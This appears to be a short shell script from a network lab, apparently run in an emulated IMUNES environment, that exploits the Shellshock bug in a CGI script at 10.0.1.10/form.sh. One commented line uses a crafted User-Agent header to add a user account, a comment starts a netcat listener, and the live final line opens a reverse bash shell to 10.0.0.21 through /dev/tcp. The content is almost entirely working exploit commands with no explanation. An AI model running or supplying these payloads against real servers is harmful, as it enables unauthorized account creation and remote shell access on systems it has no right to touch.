#sudo himage attacker fetch -o- -q --user-agent='() { echo ; }; echo "Content-type: text/plain"; echo ""; echo "`/usr/sbin/pw useradd attacker`";' http://10.0.1.10/form.sh
# listen on attacker in another terminal
# nc -l 8080 -vvv
sudo himage Attacker fetch -o- -q --user-agent='() { echo ; }; echo "Content-type: text/plain"; echo ""; echo "`/usr/local/bin/bash -i >& /dev/tcp/10.0.0.21/8080 0>&1`";' http://10.0.1.10/form.sh
